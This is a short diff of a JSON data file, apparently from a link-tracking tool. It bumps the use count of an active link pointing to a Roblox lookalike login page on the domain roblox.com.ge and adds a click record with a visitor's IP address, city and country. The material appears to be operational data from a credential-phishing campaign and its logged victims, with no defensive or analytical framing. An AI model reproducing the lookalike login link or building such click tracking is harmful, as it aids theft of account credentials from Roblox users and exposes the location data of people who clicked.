@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1696,
+    "useCount": 1697,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13736,6 +13736,14 @@
         "city": "Carbajales",
         "flag": "🇭🇳",
         "countryCode": "HN"
+      },
+      {
+        "timestamp": 1777662953866,
+        "ip": "182.62.77.9",
+        "country": "Malaysia",
+        "city": "Kuala Lumpur",
+        "flag": "🇲🇾",
+        "countryCode": "MY"
       }
     ]
   },
